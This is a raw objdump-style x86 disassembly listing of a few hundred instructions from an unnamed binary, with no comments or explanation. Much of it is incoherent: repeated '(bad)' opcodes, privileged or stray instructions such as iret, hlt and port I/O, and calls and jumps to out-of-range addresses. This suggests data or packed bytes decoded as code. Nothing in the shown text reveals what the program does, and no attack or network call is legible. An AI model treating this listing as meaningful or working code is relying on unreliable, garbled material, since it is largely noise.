  41519f:	fadd   DWORD PTR [ebx]
  4151a1:	inc    ebp
  4151a2:	jmp    0x41512f
  4151a4:	mov    ecx,DWORD PTR [esp+edx*2]
  4151a7:	rol    DWORD PTR [ebp+0x45],0x8b
  4151ab:	mov    edi,esp
  4151ad:	lock (bad) 
  4151af:	dec    ebp
  4151b0:	ret    
  4151b1:	mov    eax,DWORD PTR [ebp+0x10]
  4151b4:	mov    eax,DWORD PTR [ecx-0x4]
  4151b7:	mov    eax,edi
  4151b9:	fadd   st,st(3)
  4151bb:	enter  0x1645,0x8b
  4151bf:	inc    ebp
  4151c0:	cld    
  4151c1:	mov    ecx,DWORD PTR [ebp+0xc]
  4151c4:	xor    ecx,DWORD PTR [ebp+0x3]
  4151c7:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  4151cd:	sub    eax,DWORD PTR [ebp-0x17]
  4151d0:	xor    eax,DWORD PTR [edx]
  4151d2:	pushf  
  4151d3:	add    bh,al
  4151d5:	or     al,0xd8
  4151d7:	jne    0x41515e
  4151d9:	(bad)  
  4151da:	clc    
  4151db:	mov    al,0x45
  4151dd:	call   0xffde481f
  4151e2:	jmp    0xdd5518
  4151e7:	mov    DWORD PTR [ebp-0x30],eax
  4151ea:	xor    eax,DWORD PTR [ebp+0x3]
  4151ed:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  4151f3:	enter  0x8503,0xc
  4151f7:	clc    
  4151f8:	inc    ebp
  4151f9:	inc    ebp
  4151fa:	push   DWORD PTR [edx]
  4151fc:	in     al,dx
  4151fd:	pushf  
  4151fe:	jne    0x41518d
  415200:	mov    edx,eax
  415202:	clc    
  415203:	dec    ebp
  415204:	out    dx,eax
  415205:	(bad)  
  415206:	dec    esp
  415208:	mov    DWORD PTR [ebp-0x10],ecx
  41520b:	lea    eax,[ebp-0x38]
  41520e:	cmp    DWORD PTR [ebp-0x64],ecx
  415211:	lea    ecx,[ebx-0x38b2273c]
  415217:	mov    eax,ebx
  415219:	cld    
  41521a:	(bad)  
  41521b:	iret   
  41521c:	mov    esp,0xf74de8cb
  415221:	jmp    0x865425
  415226:	test   DWORD PTR [ebx],esi
  415228:	je     0x4151c6
  41522a:	mov    ecx,DWORD PTR [edi]
  41522c:	fdivr  st,st(6)
  41522e:	mov    DWORD PTR [eax],0xe8ff8bc3
  415234:	lock iret 
  415236:	inc    ebp
  415237:	lock push eax
  415239:	retf   
  41523a:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  415241:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  415248:	dec    ebp
  415249:	mov    DWORD PTR [ebx],ebp
  41524b:	fmul   DWORD PTR [ecx+0x458bd845]
  415251:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  415257:	enter  0x1303,0xc
  41525b:	inc    ebp
  41525c:	dec    ebp
  41525d:	xor    edi,DWORD PTR [ebx]
  41525f:	add    esi,DWORD PTR [edx+0x50]
  415262:	mov    ecx,DWORD PTR [eax+esi*8]
  415265:	inc    ebp
  415266:	inc    eax
  415267:	push   eax
  415268:	mov    ebp,esp
  41526a:	lock inc DWORD PTR [ecx-0x75]
  41526e:	mov    esp,esp
  415270:	fadd   DWORD PTR [eax]
  415272:	rol    edi,0xee
  415275:	test   BYTE PTR [eax],al
  415277:	dec    esp
  415278:	push   0x32
  41527a:	dec    DWORD PTR [ebx-0x30ba0314]
  415280:	push   eax
  415281:	mov    dh,0x21
  415283:	add    edi,edi
  415285:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41528b:	add    BYTE PTR [ebp-0x75],al
  41528e:	(bad)  
  41528f:	loopne 0x41525d
  415291:	add    BYTE PTR [ebp+0x4584f8c7],al
  415297:	dec    esp
  415298:	xor    esi,DWORD PTR [edx]
  41529a:	pushf  
  41529b:	mov    eax,edi
  41529d:	cld    
  41529e:	(bad)  
  41529f:	iret   
  4152a0:	test   DWORD PTR [esi+0x3b4d03f8],esi
  4152a6:	mov    DWORD PTR [edi],ecx
  4152a8:	in     al,0x58
  4152aa:	dec    ebp
  4152ab:	add    BYTE PTR [ecx+0x4df0e08b],cl
  4152b1:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  4152b7:	dec    esp
  4152b8:	mov    DWORD PTR [edx],esi
  4152ba:	fmul   QWORD PTR [ebx-0x30cc03b3]
  4152c0:	add    esi,DWORD PTR [esi+0x3bd80389]
  4152c6:	test   DWORD PTR [edi],0x3d3800
  4152cc:	test   DWORD PTR [ebx+0x84dcf8],ecx
  4152d2:	add    edi,eax
  4152d4:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  4152db:	mov    eax,DWORD PTR [ebx]
  4152dd:	cld    
  4152de:	mov    edi,ecx
  4152e0:	hlt    
  4152e1:	mov    dh,0x45
  4152e3:	add    esi,DWORD PTR [ebx]
  4152e5:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  4152eb:	add    BYTE PTR [eax],al
  4152ed:	mov    eax,DWORD PTR [ebp-0x20]
  4152f0:	mov    eax,DWORD PTR [eax]
  4152f2:	call   0x33c5a0be
  4152f7:	dec    esp
  4152f8:	add    esi,DWORD PTR [edx]
  4152fa:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  415300:	cld    
  415301:	iret   
  415302:	(bad)  
  415303:	mov    ebx,es
  415305:	dec    esp
  415306:	push   0x32
  415308:	lea    esi,[edx]
  41530a:	mov    al,0x8b
  41530c:	call   0xff4b4e01
  415311:	iret   
  415312:	inc    ebp
  415313:	mov    WORD PTR [ebx-0x75cdccb4],cs
  415319:	or     al,BYTE PTR ds:0xe4728b
  41531f:	or     DWORD PTR [ebp-0x31],ecx
  415322:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  415329:	cmp    al,cl
  41532b:	je     0x415505
  415331:	mov    eax,DWORD PTR [ebp-0x10]
  415334:	mov    eax,DWORD PTR [eax]
  415336:	xor    eax,edi
  415338:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41533f:	mov    ecx,DWORD PTR [ebp-0x20]
  415342:	xor    ecx,DWORD PTR [ecx]
  415344:	bswap  edi
  415346:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41534e:	add    DWORD PTR [ebx+0x945dc00],ecx
  415354:	mov    ecx,edi
  415356:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41535d:	or     al,BYTE PTR [eax]
  41535f:	mov    ecx,DWORD PTR [ebp-0x20]
  415362:	xor    ecx,DWORD PTR [ecx]
  415364:	bswap  edi
  415366:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41536e:	add    DWORD PTR [edi],ecx
  415370:	add    BYTE PTR [eax-0x7474ffbb],dl
  415376:	xor    ebx,esp
  415378:	mov    al,BYTE PTR [eax]
  41537a:	add    eax,0x8472c7
  41537f:	dec    esp
  415380:	dec    ebp
  415381:	xor    dh,BYTE PTR [ebx]
  415383:	mov    ecx,DWORD PTR [edi]
  415385:	lock ror BYTE PTR [ecx],0xcb
  415389:	iret   
  41538a:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  415392:	inc    ebp
  415393:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  415399:	iret   
  41539a:	add    eax,0x4c728c
  41539f:	xor    cl,BYTE PTR [ebp+0xa]
  4153a2:	mov    ecx,DWORD PTR [ebx+0x98af033]
  4153a8:	or     eax,0x8c72cf
  4153ad:	push   eax
  4153ae:	shl    DWORD PTR [edx],0x4d
  4153b1:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  4153b7:	fmul   QWORD PTR ds:0xc77200
  4153bd:	test   cl,al
  4153bf:	dec    esp
  4153c0:	dec    ebp
  4153c1:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  4153c7:	or     DWORD PTR ds:0x8c72cf,ecx
  4153cd:	dec    esp
  4153ce:	enter  0x8532,0x32
  4153d2:	add    BYTE PTR [ebx+0x945e000],cl
  4153d8:	mov    ecx,edi
  4153da:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  4153e1:	or     al,BYTE PTR [eax]
  4153e3:	mov    ecx,DWORD PTR [ebp-0x24]
  4153e6:	mov    ecx,DWORD PTR [ecx]
  4153e8:	xor    ecx,edi
  4153ea:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  4153f1:	cmp    al,cl
  4153f3:	jne    0x415442
  4153f5:	lea    ecx,[ebx-0x7517cc50]
  4153fb:	sti    
  4153fc:	or     eax,0x4d72ff
  415401:	cmp    eax,ecx
  415403:	je     0x415452
  415405:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41540b:	ret    
  41540c:	or     eax,0x8b7245
  415411:	call   0x84c71bde
  415416:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41541d:	mov    esi,DWORD PTR [ebx]
  41541f:	cld    
  415420:	mov    dl,BYTE PTR [ebp+0x5]
  415423:	xor    esi,DWORD PTR [edx+0x3]
  415426:	add    BYTE PTR [ebx],bh
  415428:	dec    ebp
  415429:	jnp    0x8b408826
  41542f:	mov    ecx,DWORD PTR ds:0x4d72fc
  415435:	xor    eax,ecx
  415437:	add    ecx,DWORD PTR [ebp+0x3b]
  41543a:	mov    esi,DWORD PTR [ebp+0x33]
  41543d:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  415443:	xor    eax,DWORD PTR [eax]
  415445:	(bad)  
  415446:	ror    DWORD PTR [eax],0x4d
  415449:	jb     0x4153d6
  41544b:	add    BYTE PTR [ebx],dh
  41544d:	ja     0x4153d9
  41544f:	sbb    BYTE PTR ds:0x8d7275,cl
  415455:	cwde   
  415456:	enter  0x50e8,0xf3
  41545a:	inc    ebp
  41545b:	dec    DWORD PTR [ebx-0x7574ccbb]
  415461:	fadd   DWORD PTR ds:0xc372c7
  415467:	ror    DWORD PTR [ebp+0x13],0x8b
  41546b:	inc    ebp
  41546c:	xor    esi,DWORD PTR [ebx]
  41546e:	mov    al,BYTE PTR [ebx]
  415470:	or     eax,0x187250
  415475:	inc    ebp
  415476:	rcl    DWORD PTR [eax+0x4d],0xdc
  41547a:	mov    edi,edi
  41547c:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  415482:	jb     0x41540d
  415484:	add    ah,bl
  415486:	shl    DWORD PTR [ebp+0x4d],0xff
  41548a:	mov    ebx,esp
  41548c:	xor    eax,DWORD PTR [ebp-0x76]
  41548f:	add    ecx,DWORD PTR ds:0xe87208
  415495:	repz enter 0x10ff,0x45
  41549a:	inc    ebp
  41549b:	mov    edx,DWORD PTR [eax-0x28]
  41549e:	xor    bh,al
  4154a0:	inc    ebx
  4154a2:	mov    eax,ecx
  4154a4:	mov    eax,0xa00c111
  4154a9:	jne    0x4154f0
  4154ab:	mov    esi,DWORD PTR [ebx]
  4154ad:	test   al,0x3
  4154af:	inc    ebp
  4154b0:	mov    DWORD PTR [eax-0xc],edx
  4154b3:	mov    ds:0x8b33ff45,al
  4154b8:	lea    edx,[eax]
  4154ba:	xor    BYTE PTR [ebp+0x72],cl
  4154bd:	add    DWORD PTR [eax],eax
  4154bf:	mov    eax,edi
  4154c1:	lods   al,BYTE PTR ds:[esi]
  4154c2:	dec    ebp
  4154c3:	inc    ebp
  4154c4:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  4154ca:	retf   
  4154cb:	mov    edx,ecx
  4154cd:	adc    al,0x84
  4154cf:	(bad)  
  4154d0:	std    
  4154d1:	ret    
  4154d2:	jmp    FWORD PTR [edi-0x37474bb]
  4154d8:	hlt    
  4154d9:	push   ebp
  4154da:	(bad)  
  4154db:	xor    eax,ebx
  4154dd:	(bad)  
  4154de:	enter  0x1111,0x72
  4154e2:	inc    ebp
  4154e3:	add    BYTE PTR [ebx-0x387deb3f],cl
  4154e9:	cld    
  4154ea:	test   bh,bh
  4154ec:	pushf  
  4154ed:	inc    ebp
  4154ee:	xor    bl,BYTE PTR [edi-0x15]
  4154f1:	pop    ebx
  4154f2:	push   0xffffffc2
  4154f4:	inc    DWORD PTR [eax]
  4154f6:	in     al,dx
  4154f7:	mov    eax,DWORD PTR [ebp+0x51]
  4154fa:	push   eax
  4154fb:	inc    ebp
  4154fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154fd:	mov    edi,edi
  4154ff:	or     BYTE PTR [ebx+0x4d80fc16],cl
  415505:	add    DWORD PTR [ebx],esi
  415507:	add    BYTE PTR [ebx],al
  415509:	add    BYTE PTR [ebx],bh
  41550b:	icebp  
  41550c:	je     0x415516
  41550e:	mov    eax,DWORD PTR [edi]
  415510:	cld    
  415511:	rol    edi,0x72
  415514:	ret    
  415515:	add    BYTE PTR [edx-0x2f],ch
  415518:	lea    edx,[eax]
  41551a:	cwde   
  41551b:	jne    0x415505
  41551d:	(bad)  
  41551e:	clc    
  41551f:	or     al,0xff
  415521:	inc    DWORD PTR [ebp-0x18]
  415524:	cmp    ebx,0x18
  415527:	inc    DWORD PTR [ebp+0x6]
  41552a:	call   FWORD PTR [ebp-0x54]
  41552d:	or     al,0x75
  41552f:	push   ebp
  415530:	mov    ebp,esp
  415532:	test   al,0x53
  415534:	inc    ebp
  415535:	mov    edx,DWORD PTR [eax-0x75]
  415538:	imul   ecx,DWORD PTR [eax],0xffffffff
  41553b:	dec    ebp
  41553c:	mov    edx,DWORD PTR [edi-0x4]
  41553f:	push   ebp
  415540:	dec    ebp
  415541:	push   ecx
  415542:	xor    esi,DWORD PTR [ebx]
  415544:	add    edi,DWORD PTR [edi+0x74723b]
  41554a:	push   0xffffffc7
  41554c:	inc    DWORD PTR [ecx]
  41554e:	lods   al,BYTE PTR ds:[esi]
  41554f:	inc    ebp
  415550:	inc    ebp
  415551:	mov    eax,DWORD PTR [ebx]
  415553:	xchg   esp,eax
  415554:	or     BYTE PTR [eax],al
  415556:	call   0xffcd4de6
  41555b:	adc    al,0x45
  41555d:	or     BYTE PTR [ebx+0x800ac01],0x0
  415564:	inc    ebp
  415565:	inc    ecx
  415566:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41556c:	mov    eax,DWORD PTR [ecx]
  41556e:	call   0x338aa273
  415573:	push   0x3
  415575:	push   0xc1300f
  41557a:	dec    ebp
  41557b:	jo     0x415508
  41557d:	push   0xffffffd4
  41557f:	dec    edi
  415581:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  415588:	cmp    eax,edi
  41558a:	cmovne edx,DWORD PTR [edi-0x75]
  41558e:	call   DWORD PTR [eax]
  415590:	mov    eax,DWORD PTR [ebp+0x8]
  415593:	call   FWORD PTR [esi+0x14]
  415596:	leave  
  415597:	inc    ebp
  415598:	adc    BYTE PTR [eax+0x55],dl
  41559b:	jne    0x415589
  41559d:	call   0xff52552d
  4155a2:	dec    ebp
  4155a3:	inc    ebp
  4155a4:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4155aa:	add    BYTE PTR [ebx],bh
  4155ac:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4155b0:	push   ebp
  4155b1:	or     al,0x51
  4155b3:	dec    ebp
  4155b4:	xor    DWORD PTR [ebx],0xf32039c
  4155ba:	cmp    eax,DWORD PTR [ebp+0x74]
  4155bd:	mov    edi,edi
  4155bf:	pop    edi
  4155c0:	adc    BYTE PTR [ebx+0x75],bl
  4155c3:	ret    0x50
  4155c6:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  4155ca:	(bad)  
  4155cb:	clc    
  4155cc:	mov    esp,ebp
  4155ce:	pop    ecx
  4155cf:	mov    ecx,0xf80085c2
  4155d4:	mov    ecx,DWORD PTR [ecx+edx*2]
  4155d7:	push   esi
  4155d8:	push   esi
  4155d9:	(bad)  
  4155da:	lock inc DWORD PTR [ebp+0x44]
  4155de:	mov    edx,DWORD PTR [eax]
  4155e0:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  4155e4:	or     BYTE PTR [ebp+0x7],dl
  4155e7:	push   ecx
  4155e8:	ret    
  4155e9:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  4155f0:	mov    esi,edi
  4155f2:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  4155f6:	cmp    BYTE PTR [ebp+0x1],0x89
  4155fa:	add    BYTE PTR [eax+ecx*1],ah
  4155fd:	cmp    DWORD PTR [ebp+0x10],eax
  415600:	mov    edx,DWORD PTR [esi]
  415602:	xchg   esp,eax
  415603:	dec    esp
  415604:	add    BYTE PTR [eax],dl
  415606:	mov    ecx,edx
  415608:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41560c:	dec    ebp
  41560d:	into   
  41560e:	mov    ebp,DWORD PTR [edi+0x240089d8]
  415614:	mov    edx,DWORD PTR [eax+0x14]
  415617:	das    
  415618:	add    al,0x45
  41561a:	add    BYTE PTR [ebp+0x0],dh
  41561d:	mov    edi,edi
  41561f:	and    al,0x50
  415621:	mov    eax,DWORD PTR [eax]
  415623:	and    al,0xd1
  415625:	xor    eax,DWORD PTR [esi]
  415627:	lea    eax,[ebp+0x8]
  41562a:	xor    esi,DWORD PTR [edx+0x3]
  41562d:	add    BYTE PTR [ecx+0x4510fc44],cl
  415633:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  415639:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  415643:	xor    bh,bh
  415645:	pushf  
  415646:	mov    edi,edi
  415648:	or     BYTE PTR [esi+ecx*1],cl
  41564b:	jne    0x415610
  41564d:	call   0xa5619
  415652:	adc    BYTE PTR [ebp+eax*2+0xc],al
  415656:	mov    ebx,DWORD PTR [eax]
  415658:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41565c:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  415664:	pop    esi
  415665:	dec    ecx
  415667:	and    al,0x10
  415669:	call   DWORD PTR [ebp+0x24]
  41566c:	in     al,dx
  41566d:	call   0xffc55556
  415672:	adc    BYTE PTR [ecx+esi*1+0xc],al
  415676:	pushf  
  415677:	pop    esi
  415678:	mov    ebp,esp
  41567a:	and    al,0xc2
  41567c:	push   edi
  41567d:	add    BYTE PTR [ecx+0x33],al
  415680:	mov    DWORD PTR [ebp+0x24],esi
  415683:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  415689:	dec    DWORD PTR [eax]
  41568b:	and    al,0x7
  41568d:	(bad)  
  41568e:	cli    
  41568f:	and    al,0x9c
  415691:	or     BYTE PTR [edx],dh
  415693:	sbb    BYTE PTR [ebx],al
  415695:	adc    al,0x89
  415697:	jmp    DWORD PTR [esp]
  41569a:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  4156a0:	adc    al,0x8
  4156a2:	dec    ebp
  4156a3:	adc    BYTE PTR [ebp-0x7c],dh
  4156a6:	mov    esi,DWORD PTR [edx]
  4156a8:	and    al,0x24
  4156aa:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  4156b0:	add    edi,eax
  4156b2:	pcmpeqb mm1,mm2
  4156b5:	jmp    0x415703
  4156b7:	dec    DWORD PTR [eax]
  4156b9:	je     0x4156a6
  4156bb:	mov    edi,DWORD PTR [ecx]
  4156bd:	pop    ebp
  4156be:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  4156c2:	pushf  
  4156c3:	mov    DWORD PTR [eax-0x8],ebp
  4156c6:	jge    0x415730
  4156c8:	dec    DWORD PTR [ecx+0x5fbf7424]
